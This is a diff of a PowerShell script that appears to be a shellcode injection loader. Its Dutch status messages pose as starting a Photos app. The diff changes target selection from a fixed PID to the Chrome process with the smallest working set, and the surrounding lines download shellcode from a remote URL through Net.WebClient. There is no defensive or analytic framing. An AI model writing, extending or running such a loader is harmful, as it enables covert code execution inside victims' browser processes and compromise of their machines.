@@ -28,9 +28,8 @@ if (-not $edgeProcesses) {
     Write-Host "[+] Foto's-app succesvol gestart" -ForegroundColor Green
 }
 
-$targetProcess = $edgeProcesses | Select-Object -First 1
-$targetPID = 14068
-Write-Host "[+] Target foto's gevonden (PID: $targetPID)" -ForegroundColor Green
+$targetProcess = $chromeProcesses | Sort-Object WorkingSet64 | Select-Object -First 1
+$targetPID = $targetProcess.Id
 
 try {
     $shellcode = (New-Object Net.WebClient).DownloadData($url)
